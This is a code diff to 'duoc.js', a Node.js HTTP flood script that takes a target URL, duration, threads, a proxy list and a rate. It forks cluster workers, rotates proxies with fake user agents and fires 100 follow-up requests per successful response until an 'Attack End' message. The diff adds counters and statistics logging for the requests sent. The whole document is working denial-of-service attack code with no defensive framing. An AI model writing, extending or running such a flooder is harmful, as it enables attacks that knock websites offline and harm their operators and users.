@@ -4,6 +4,8 @@ const request = require('request'),
       fakeUa = require('fake-useragent'),
       cluster = require('cluster');
 
+let totalSent = 0; // Biến đếm số request gửi thành công
+
 async function main_process() {
     if (process.argv.length !== 7) {
         console.log(`Usage: node duoc.js <URL> <TIME> <THREADS> <bypass | proxy.txt> <RATE>`);
@@ -64,24 +66,26 @@ async function main_process() {
                 if (error || !response) {
                     console.warn(`[${proxy}] ERROR: ${error ? error.code : 'No response'} → switching proxy`);
                     proxies = proxies.remove_by_value(proxy);
-                    return run(); // retry với proxy khác
+                    return run(); // Retry với proxy khác
                 }
 
                 console.log(response.statusCode, "HTTP_PROXY");
 
                 if (response.statusCode >= 200 && response.statusCode <= 226) {
+                    totalSent += 1;
                     for (let i = 0; i < 100; i++) {
-                        proxiedRequest(config);
+                        proxiedRequest(config, () => totalSent++);
                     }
                 } else {
                     console.warn(`[${proxy}] BLOCKED with status ${response.statusCode} → removing`);
                     proxies = proxies.remove_by_value(proxy);
-                    return run(); // retry với proxy khác
+                    return run(); // Retry với proxy khác
                 }
             });
         } else {
             request(config, function (error, response) {
-                if (response) {
+                if (response && response.statusCode >= 200 && response.statusCode <= 226) {
+                    totalSent++;
                     console.log(response.statusCode, "HTTP_RAW");
                 }
             });
@@ -102,9 +106,16 @@ async function main_process() {
                 cluster.fork();
                 console.log(`Started thread: ${i + 1}`);
             }
+
             cluster.on('exit', () => {
                 cluster.fork();
             });
+
+            // In thống kê mỗi 5 giây
+            setInterval(() => {
+                console.log(`[STATS] Requests sent: ${totalSent}`);
+            }, 5000);
+
         } else {
             thread();
         }
@@ -114,6 +125,7 @@ async function main_process() {
 
     setTimeout(() => {
         console.log('Attack End');
+        console.log(`Total requests sent: ${totalSent}`);
         process.exit(0);
     }, time * 1000);
 }
